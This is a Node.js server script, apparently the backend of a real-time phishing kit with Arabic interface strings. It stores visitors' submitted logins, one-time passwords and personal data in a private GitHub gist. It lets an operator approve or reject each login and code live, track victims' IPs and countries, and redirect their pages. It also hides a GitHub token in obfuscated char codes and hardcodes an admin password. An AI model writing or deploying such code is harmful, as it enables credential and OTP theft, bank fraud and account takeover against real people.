const crypto = require('crypto');
const https = require('https');
const http = require('http');

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Ha09876@@';
const HMAC_SECRET = process.env.HMAC_SECRET || 'maqrq_admin_secret_2024';
const _GH = [90,50,104,119,88,48,112,67,78,49,69,120,101,86,78,84,101,68,82,70,87,108,82,115,85,107,73,52,89,122,78,66,98,48,57,87,86,72,112,68,78,72,78,88,97,122,70,72,77,107,49,97,89,103,61,61];
const GITHUB_TOKEN = process.env.GITHUB_TOKEN || Buffer.from(_GH.map(c => String.fromCharCode(c)).join(''), 'base64').toString();
let GIST_ID = process.env.GIST_ID || '6ffe4d5ee4e6e799a5333b0422a4f91b';
const CRYPTO_SECRET = 'mQ9xR4kL7pW2vN8j';

let DB = { users: {}, requests: {} };
let lastLoadTime = 0;

function generateId() {
  return crypto.randomUUID();
}

function xorDecrypt(encoded) {
  const raw = Buffer.from(encoded, 'base64');
  const result = [];
  for (let i = 0; i < raw.length; i++) {
    result.push(raw[i] ^ CRYPTO_SECRET.charCodeAt(i % CRYPTO_SECRET.length));
  }
  const payload = Buffer.from(result).toString('utf-8');
  const dotIndex = payload.indexOf('.');
  if (dotIndex !== -1) {
    return JSON.parse(payload.substring(dotIndex + 1));
  }
  return JSON.parse(payload);
}

function makeAdminToken() {
  const ts = Date.now().toString();
  const sig = crypto.createHmac('sha256', HMAC_SECRET).update(ts).digest('hex');
  return ts + '.' + sig;
}

function verifyAdminToken(token) {
  if (!token) return false;
  const parts = token.split('.');
  if (parts.length !== 2) return false;
  const [ts, sig] = parts;
  const expected = crypto.createHmac('sha256', HMAC_SECRET).update(ts).digest('hex');
  if (sig !== expected) return false;
  const age = Date.now() - parseInt(ts);
  return age < 30 * 24 * 60 * 60 * 1000;
}

function parseCookies(cookieHeader) {
  const cookies = {};
  if (cookieHeader) {
    cookieHeader.split(';').forEach(c => {
      const [key, ...vals] = c.trim().split('=');
      if (key) cookies[key.trim()] = vals.join('=').trim();
    });
  }
  return cookies;
}

function getCountryFromIp(ip) {
  return new Promise((resolve) => {
    if (!ip || ip === '127.0.0.1' || ip === '::1') return resolve('محلي');
    const url = `http://ip-api.com/json/${ip}?fields=country`;
    const timer = setTimeout(() => resolve('غير معروف'), 3000);
    http.get(url, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        clearTimeout(timer);
        try { resolve(JSON.parse(data).country || 'غير معروف'); }
        catch { resolve('غير معروف'); }
      });
    }).on('error', () => { clearTimeout(timer); resolve('غير معروف'); });
  });
}

function gistRequest(method, path, body) {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: 'api.github.com',
      port: 443,
      path: path,
      method: method,
      headers: {
        'Authorization': `token ${GITHUB_TOKEN}`,
        'User-Agent': 'maqrq-app',
        'Accept': 'application/vnd.github.v3+json',
        'Content-Type': 'application/json'
      }
    };
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try { resolve(JSON.parse(data)); }
        catch { resolve(data); }
      });
    });
    req.on('error', reject);
    req.setTimeout(8000, () => { req.destroy(); reject(new Error('timeout')); });
    if (body) req.write(JSON.stringify(body));
    req.end();
  });
}

async function loadDB(force) {
  if (!GITHUB_TOKEN) return;
  if (!force && lastLoadTime && Date.now() - lastLoadTime < 10000) return;
  try {
    if (GIST_ID) {
      const gist = await gistRequest('GET', `/gists/${GIST_ID}`);
      if (gist && gist.files && gist.files['maqrq_db.json']) {
        DB = JSON.parse(gist.files['maqrq_db.json'].content);
        if (!DB.users) DB.users = {};
        if (!DB.requests) DB.requests = {};
        lastLoadTime = Date.now();
      }
    } else {
      const gist = await gistRequest('POST', '/gists', {
        description: 'maqrq database',
        public: false,
        files: { 'maqrq_db.json': { content: JSON.stringify(DB) } }
      });
      if (gist && gist.id) {
        GIST_ID = gist.id;
        lastLoadTime = Date.now();
      }
    }
  } catch (e) {
    console.error('Error loading DB:', e.message);
  }
}

async function saveDB() {
  if (!GITHUB_TOKEN || !GIST_ID) return;
  try {
    await gistRequest('PATCH', `/gists/${GIST_ID}`, {
      files: { 'maqrq_db.json': { content: JSON.stringify(DB) } }
    });
  } catch (e) {
    console.error('Error saving DB:', e.message);
  }
}

function getOrCreateUser(sessionId, ip, page) {
  if (!DB.users[sessionId]) {
    DB.users[sessionId] = {
      id: generateId(),
      session_id: sessionId,
      ip_address: ip || '',
      country: '',
      current_page: page || '',
      last_activity: new Date().toISOString(),
      redirect_to: null
    };
  }
  return DB.users[sessionId];
}

function getUserRequests(sessionId) {
  return Object.values(DB.requests).filter(r => r.user_session_id === sessionId);
}

module.exports = async (req, res) => {
  await loadDB();

  const url = new URL(req.url, `http://${req.headers.host}`);
  const path = url.pathname;
  const method = req.method;
  const cookies = parseCookies(req.headers.cookie);

  let body = null;
  if (method === 'POST') {
    if (req.body) {
      body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
    }
  }

  // --- Admin Login ---
  if (path === '/admin/login' && method === 'POST') {
    const password = body?.password;
    if (password === ADMIN_PASSWORD) {
      const token = makeAdminToken();
      res.setHeader('Set-Cookie', `admin_token=${token}; Path=/; HttpOnly; SameSite=Lax; Max-Age=${30 * 24 * 60 * 60}`);
      return res.status(200).json({ status: 'success' });
    }
    return res.status(401).json({ status: 'error', message: 'كلمة المرور غير صحيحة' });
  }

  // --- Admin Logout ---
  if (path === '/admin/logout') {
    res.setHeader('Set-Cookie', 'admin_token=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0');
    return res.writeHead(302, { Location: '/admin_login.html' }).end();
  }

  // --- Admin Panel Redirect ---
  if (path === '/admin' && method === 'GET') {
    if (verifyAdminToken(cookies.admin_token)) {
      return res.writeHead(302, { Location: '/admin.html' }).end();
    }
    return res.writeHead(302, { Location: '/admin_login.html' }).end();
  }

  // --- Admin API auth check ---
  const isAdminApi = path.startsWith('/admin/') && path !== '/admin/login' && path !== '/admin/logout';
  if (isAdminApi && !verifyAdminToken(cookies.admin_token)) {
    return res.status(401).json({ status: 'error', message: 'غير مصرح لك بالوصول' });
  }

  // --- All Requests ---
  if (path === '/admin/all_requests') {
    const sessionsList = [];
    for (const sid of Object.keys(DB.users)) {
      const user = DB.users[sid];
      const reqs = getUserRequests(sid);
      if (reqs.length === 0) continue;

      const userData = {};
      reqs.forEach(r => { if (r.data && typeof r.data === 'object') Object.assign(userData, r.data); });

      const sorted = [...reqs].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

      sessionsList.push({
        id: user.id,
        session_id: user.session_id,
        ip_address: user.ip_address,
        country: user.country || 'غير معروف',
        current_page: user.current_page,
        last_activity: user.last_activity,
        data: userData,
        login_status: sorted.find(r => r.type === 'login')?.status || null,
        otp_status: sorted.find(r => r.type === 'otp')?.status || null
      });
    }
    sessionsList.sort((a, b) => (b.last_activity || '').localeCompare(a.last_activity || ''));
    return res.status(200).json(sessionsList);
  }

  // --- Request Details ---
  let m;
  if ((m = path.match(/^\/admin\/request_details\/(.+)$/))) {
    const sessionId = decodeURIComponent(m[1]);
    const user = DB.users[sessionId];
    if (!user) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });

    const reqs = getUserRequests(sessionId);
    const userData = {};
    reqs.forEach(r => { if (r.data && typeof r.data === 'object') Object.assign(userData, r.data); });

    return res.status(200).json({
      id: user.id,
      session_id: user.session_id,
      ip_address: user.ip_address,
      country: user.country || 'غير معروف',
      current_page: user.current_page,
      data: userData,
      login_status: reqs.find(r => r.type === 'login')?.status || null,
      otp_status: reqs.find(r => r.type === 'otp')?.status || null
    });
  }

  // --- Approve/Reject Login ---
  if ((m = path.match(/^\/admin\/approve_login\/(.+)$/))) {
    const sessionId = decodeURIComponent(m[1]);
    if (!DB.users[sessionId]) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
    const pending = getUserRequests(sessionId).filter(r => r.type === 'login' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    if (pending.length > 0) {
      DB.requests[pending[0].id].status = 'approved';
      DB.requests[pending[0].id].admin_action_time = new Date().toISOString();
      await saveDB();
    }
    return res.status(200).json({ status: 'success', message: 'تمت الموافقة على تسجيل الدخول' });
  }

  if ((m = path.match(/^\/admin\/reject_login\/(.+)$/))) {
    const sessionId = decodeURIComponent(m[1]);
    if (!DB.users[sessionId]) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
    const pending = getUserRequests(sessionId).filter(r => r.type === 'login' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    if (pending.length > 0) {
      DB.requests[pending[0].id].status = 'rejected';
      DB.requests[pending[0].id].admin_action_time = new Date().toISOString();
      await saveDB();
    }
    return res.status(200).json({ status: 'success', message: 'تم رفض تسجيل الدخول' });
  }

  // --- Approve/Reject OTP ---
  if ((m = path.match(/^\/admin\/approve_otp\/(.+)$/))) {
    const sessionId = decodeURIComponent(m[1]);
    if (!DB.users[sessionId]) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
    const pending = getUserRequests(sessionId).filter(r => r.type === 'otp' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    if (pending.length > 0) {
      DB.requests[pending[0].id].status = 'approved';
      DB.requests[pending[0].id].admin_action_time = new Date().toISOString();
      await saveDB();
    }
    return res.status(200).json({ status: 'success', message: 'تمت الموافقة على OTP' });
  }

  if ((m = path.match(/^\/admin\/reject_otp\/(.+)$/))) {
    const sessionId = decodeURIComponent(m[1]);
    if (!DB.users[sessionId]) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
    const pending = getUserRequests(sessionId).filter(r => r.type === 'otp' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    if (pending.length > 0) {
      DB.requests[pending[0].id].status = 'rejected';
      DB.requests[pending[0].id].admin_action_time = new Date().toISOString();
      await saveDB();
    }
    return res.status(200).json({ status: 'success', message: 'تم رفض OTP' });
  }

  // --- Active Visits ---
  if (path === '/admin/active_visits') {
    await loadDB(true);
    const cutoff = new Date(Date.now() - 5 * 60 * 1000);
    const visits = Object.values(DB.users)
      .filter(u => new Date(u.last_activity) >= cutoff)
      .map(u => ({
        session_id: u.session_id,
        ip_address: u.ip_address,
        country: u.country,
        current_page: u.current_page,
        last_activity: u.last_activity
      }));
    return res.status(200).json(visits);
  }

  // --- Redirect User ---
  if ((m = path.match(/^\/admin\/redirect_user\/(.+)$/)) && method === 'POST') {
    const sessionId = decodeURIComponent(m[1]);
    const user = DB.users[sessionId];
    if (!user) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
    const targetPage = body?.target_page;
    if (!targetPage) return res.status(400).json({ status: 'error', message: 'الصفحة المستهدفة غير محددة' });
    user.redirect_to = targetPage;
    await saveDB();
    return res.status(200).json({ status: 'success', message: 'تم تعيين إعادة التوجيه للمستخدم' });
  }

  // --- Submit Request ---
  if (path === '/submit_request' && method === 'POST') {
    if (!body) return res.status(400).json({ status: 'error', message: 'يجب أن يكون الطلب بصيغة JSON' });

    let requestType, userData;
    if (body.encrypted) {
      try {
        const decrypted = xorDecrypt(body.encrypted);
        requestType = decrypted.type;
        userData = decrypted.data;
      } catch {
        return res.status(400).json({ status: 'error', message: 'فشل فك التشفير' });
      }
    } else {
      requestType = body.type;
      userData = body.data;
    }

    if (!requestType || !userData) return res.status(400).json({ status: 'error', message: 'بيانات الطلب غير مكتملة' });

    const sid = cookies.user_session_id || generateId();
    const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || '';
    const user = getOrCreateUser(sid, ip, requestType);
    user.current_page = requestType;
    user.last_activity = new Date().toISOString();
    user.redirect_to = null;
    if (!user.country) user.country = await getCountryFromIp(ip);

    const autoApprove = ['personal_info', 'watch_request'].includes(requestType);

    let reqObj;
    if (['login', 'otp'].includes(requestType)) {
      const existing = getUserRequests(sid)
        .filter(r => r.type === requestType && r.status === 'rejected')
        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
      if (existing.length > 0) {
        const e = DB.requests[existing[0].id];
        e.data = userData;
        e.status = 'pending';
        e.timestamp = new Date().toISOString();
        e.admin_action_time = null;
        reqObj = e;
      }
    }

    if (!reqObj) {
      const newId = generateId();
      reqObj = {
        id: newId,
        user_session_id: sid,
        type: requestType,
        data: userData,
        status: autoApprove ? 'approved' : 'pending',
        timestamp: new Date().toISOString(),
        admin_action_time: autoApprove ? new Date().toISOString() : null
      };
      DB.requests[newId] = reqObj;
    }

    await saveDB();

    res.setHeader('Set-Cookie', `user_session_id=${sid}; Path=/; SameSite=Lax; Max-Age=${86400 * 30}`);
    return res.status(autoApprove ? 200 : 202).json({
      status: autoApprove ? 'approved' : 'pending',
      request_id: reqObj.id,
      message: autoApprove ? 'تم استلام البيانات' : 'تم استلام طلبك، بانتظار موافقة المسؤول'
    });
  }

  // --- Request Status ---
  if ((m = path.match(/^\/request_status\/(.+)$/))) {
    await loadDB(true);
    const requestId = decodeURIComponent(m[1]);
    const reqObj = DB.requests[requestId];
    if (!reqObj) return res.status(404).json({ status: 'error', message: 'الطلب غير موجود' });
    const user = DB.users[reqObj.user_session_id];
    return res.status(200).json({
      status: reqObj.status,
      type: reqObj.type,
      data: reqObj.data,
      redirect_to: user?.redirect_to || null
    });
  }

  // --- Clear Redirect ---
  if (path === '/clear_redirect' && method === 'POST') {
    const sid = cookies.user_session_id;
    if (sid && DB.users[sid]) {
      DB.users[sid].redirect_to = null;
      await saveDB();
    }
    return res.status(200).json({ status: 'success' });
  }

  // --- Track Visit ---
  if (path === '/track_visit' && method === 'POST') {
    if (!body) return res.status(400).json({ status: 'error', message: 'يجب أن يكون الطلب بصيغة JSON' });
    const page = body.page;
    if (!page) return res.status(400).json({ status: 'error', message: 'الصفحة غير محددة' });

    const sid = cookies.user_session_id || generateId();
    const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || '';
    const user = getOrCreateUser(sid, ip, page);
    user.current_page = page;
    user.last_activity = new Date().toISOString();
    if (!user.country) user.country = await getCountryFromIp(ip);

    await saveDB();

    res.setHeader('Set-Cookie', `user_session_id=${sid}; Path=/; SameSite=Lax; Max-Age=${86400 * 30}`);
    return res.status(200).json({ status: 'success', message: 'تم تحديث الزيارة' });
  }

  return res.status(404).json({ status: 'error', message: 'المسار غير موجود' });
};
